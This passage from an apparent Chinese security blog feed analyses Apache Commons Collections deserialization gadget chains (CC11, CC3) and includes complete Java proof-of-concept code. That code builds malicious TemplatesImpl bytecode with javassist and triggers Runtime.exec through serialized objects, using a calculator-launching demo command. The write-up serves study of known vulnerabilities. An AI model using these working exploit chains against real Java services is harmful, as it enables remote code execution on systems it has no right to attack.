class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections11利用链分析</title>
      <link href="/2022/11/10/CommonsCollections11/"/>
      <url>/2022/11/10/CommonsCollections11/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections11利用链分析"><a href="#CommonsCollections11利用链分析" class="headerlink" title="CommonsCollections11利用链分析"></a>CommonsCollections11利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections11</code>链子的利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><p>可能学到这里，你和我一样会有一个疑问：<code>CommonsCollections6</code>已经通杀<code>3.1-3.2.1</code>的情况下，为什么还要学该版本下的其他链子？</p><p>个人觉得<code>CommonsCollection11</code>的存在是为了解决在<code>CommonsCollections 3.1 - 3.2.1</code>的版本下加载恶意字节码的问题。除此之外，<code>CommonsCollections6</code>在<code>shiro</code>中使用时会报错，至于为什么，具体答案留到<code>shiro</code>章节学习时再进行解惑。</p><p>这里提到恶意字节码，很快能想到前面学习的<code>CommonsCollections2</code>这条链子，聪明的你应该已经能想到了，<code>CommonsCollections11</code>就是<code>CommonsCollections2</code>和<code>CommonsCollections6</code>结合而来。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先回忆一下，<code>CommonsCollections2</code>链子只所以限制版本为<code>CommonsCollections 4.0</code>，则是因为 gadget 中用到了<code>TransformingComparator</code>类，而该类只有在 4.0 版本的时候才实现了<code>serializable</code>接口。</p><p>在<code>3.1 - 3.2.1</code>版本的时候无法使用该类，而是使用了<code>CommonsCollections6</code>中的<code>TiedMapEntry</code>类来触发<code>LazyMap#get()</code>，最后执行<code>transform()</code>方法。接下来还剩一个问题，就是如何触发<code>TemplatesImpl#newTransformer()</code>方法来加载恶意字节码？</p><p>在<code>CommonsCollections11</code>中只单独使用<code>InvokerTransformer</code>类，通过反射修改<code>iMethodName</code>为<code>newTransformer()</code>方法。 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">        commonsCollections11.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221012163340954.png" alt="image-20221012163340954"></p><p>通过把<code>TemplatesImpl</code>类对象<code>templates</code>作为<code>TiedMapEntry</code>类的<code>key</code><br><img src="images/image-20221012163435957.png" alt="image-20221012163435957"></p><p>执行到<code>LazyMap#get()</code>方法时，成功触发到<code>TemplatesImpl#newTransformer()</code>方法加载恶意类</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections3利用链分析</title>
      <link href="/2022/11/10/CommonsCollections3/"/>
      <url>/2022/11/10/CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链分析"><a href="#CommonsCollections3利用链分析" class="headerlink" title="CommonsCollections3利用链分析"></a>CommonsCollections3利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections3</code>利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">jdk 8u71 版本之前</span><br></pre></td></tr></table></figure><p>先看利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         <span class="title function_">newInstance</span><span class="params">()</span></span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>看到这个利用链，前半部分是<code>CommonsCollections1</code>的内容，而后半部分则是<code>CommonsCollection2</code>的内容，不过与<code>CommonsCollections2</code>不同的是，不再利用<code>invokerTransformer</code>类，而是使用<code>InstantiateTransformer</code>类。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>翻一下<code>ysoserial</code>中的源码<br><img src="images/image-20221010171824472.png" alt="image-20221010171824472"></p><p>可以看见这次<code>transformers</code>由<code>ConstantTransformer</code>和<code>InstantiateTransformer</code>组成，其中<code>ConstantTransformer</code>传入的类为<code>TrAXFilter</code>，先跟进该类看看源码<br><img src="images/image-20221010173113393.png" alt="image-20221010173113393"></p><p>发现该类会调用<code>newTransformer()</code>方法，接着继续跟进看<code>InstantiateTransformer()</code><br><img src="images/image-20221010174156050.png" alt="image-20221010174156050"></p><p>在<code>InstantiateTransformer#transform()</code>方法中，通过<code>getConstructor()</code>方法进行实例化，而这里的<code>input</code>则是前面构造的<code>TrAXFilter</code>类，因此可以触发<code>TransformerImpl#newTransformer()</code>方法加载构造的恶意字节码进而命令执行。</p><p>在给出的利用链中可以看到触发<code>xxx.transform()</code>方法用的是前面<code>CommonsCollections1</code>中的<code>LazyMap.get()</code>方法，因此可以编写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections3</span> <span class="variable">commonsCollections3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections3</span>();</span><br><span class="line">        commonsCollections3.serialize();</span><br><span class="line">        commonsCollections3.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
